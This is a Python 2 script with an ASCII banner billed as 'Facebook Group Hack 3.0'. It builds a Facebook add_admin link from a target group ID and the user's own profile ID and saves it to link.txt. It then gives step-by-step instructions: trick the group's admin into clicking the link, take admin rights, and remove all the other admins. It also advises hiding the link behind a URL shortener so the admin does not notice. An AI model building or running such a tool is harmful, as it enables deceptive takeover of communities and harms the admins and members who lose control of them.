import os, sys, time


# Set Colors ######

N = '\033[0m'

W = '\033[1;37m'

B = '\033[1;34m'

R = '\033[1;31m'

G = '\033[1;32m'

Y = '\033[1;33m'

C = '\033[1;36m'

##################


# Restart ####################

def restart_program():

   python = sys.executable

   os.execl(python, python, * sys.argv)

   curdir = os.getcwd()

##############################


os.system("clear")

 
print "%s  _____ %s                          %s_    _%s            _%s" % (G, R, R, R, Y)
print "%s/ ____| %s                         %s| |  | |%s          | |%s" % (G, R, R, R, Y)
print "%s| |  __ _ __ ___  _   _ _ __     %s| |__| | __ _  ___| | __%s" % (G, R, R)
print "%s| | |_ | '__/ _ \| | | | '_ \    %s|  __  |/ _` |/ __| |/ /%s" % (G, R, R)
print "%s| |__| | | | (_) | |_| | |_) |   %s| |  | | (_| | (__|   <%s" % (G, R, R)
print "%s\_____ |_|  \___/ \__,_| .__/    %s|_|  |_|\__,_|\___|_|\_\%s" % (G, R, R)
print "                       %s| |%s" % (G, B)
print "                       %s|_|%s                            %s3.0%s" % (G, B, Y, C)

print " %s==============================%s|%s==========================%s " % (C, B, C, N)

print " %s[+]%sFacebook%s Group%s Hack %s " % (C, B, W, R, N)

print " %s[+]%sDevelop %sby: %sRomeo%s &&%s Elio%s" % (C, W, G, R, W, R, W)

print " %s[+]%sFollow Me FB: %shttps://m.facebook.com/e.r.romeo.58%s" % (C, W, G, N)

print " %s[+]%sCode: %sPython%s" % (C, R, C, N)

print

Start = raw_input("%s [%s*%s] %sEnter/To/Start:%s" % (C, Y, C, W, B))


try:

	file = open("link.txt", 'w')

except(IOError):

	print "ERROR"

	sys.exit()


if Start.strip() in "01 1".split():
    
    print " %s[%s Started%s ]%s" % (R, W, R, N)

print " %s-------------------------%s" % (R, N)

print

step1 = raw_input("%s1%s)%s Find Your Target  %sGroup Id Code%s And Find Your  %sProfile Id Code%s And Note This %s {Your Target Group Id && Your Profile Id}%s...%s[%sEnter%s]%s" % (Y, C, W, R, W, R, W,C, N, C, Y, C, N))

group = raw_input(" %s(%sa%s)%sEnter Group Code%s >>>>%s " % (W, C, W, C, R, Y))

you = raw_input(" %s(%sb%s)%sEnter Your Code%s >>>>%s " % (W, C, W, C, R, Y))

print " %s[%s+%s]%s Result%s ==>%s https://m.facebook.com/group/add_admin/?group_id=%s&user_id=%s&add%s" % (C, Y, C, W, R, B, group, you, N)

print " %s--------------------------%s" % (R,N)

file.write("https://m.facebook.com/group/add_admin/?group_id=%s&user_id=%s&add" % (group, you))

step2 = raw_input("%s2%s)%s Now Copy The Link On The Result And Then Send Copied Link To %sAdmin%s Of The Group. If Its Hard To You To Copy The Link, I Have Save The Link On File *link.txt*. So Its Getting Easier, Just Open The File link.txt And Then Copy The Link Then Send To The %sAdmin%s...%s[%sEnter%s]%s" % (Y, C, W, R, W, R, W, C, Y, C, N))

step3 = raw_input("%s3%s)%s You Just Need To Wait Till The %sAdmin%s Click On The Link that You Send. Then You Will Be %sAdmin%s Of The Group...%s[%sEnter%s]%s" % (Y, C, W, R, W, R, W, C, Y, C, N))

step4 = raw_input("%s4%s)%s Now Don't Waste Your Time. Go To Group Settings And Remove All %sAdmins%s From The Group...%s[%sEnter%s]%s" % (Y, C, W, R, W, C, Y, C, N))

print

time.sleep(1)

print "%s*note:clever admin can notice the link just by one blink. So i suggest you to use shortlink like goo.gl or bit.ly etc*%s" % (W, N)

time.sleep(1)

print "%sThanks%s For %sUsing Our Program%s %s:)%s" % (C, W, R, W, Y, N)

time.sleep(1)

print "%sGood Bye %s:)%s" % (W, Y, N)

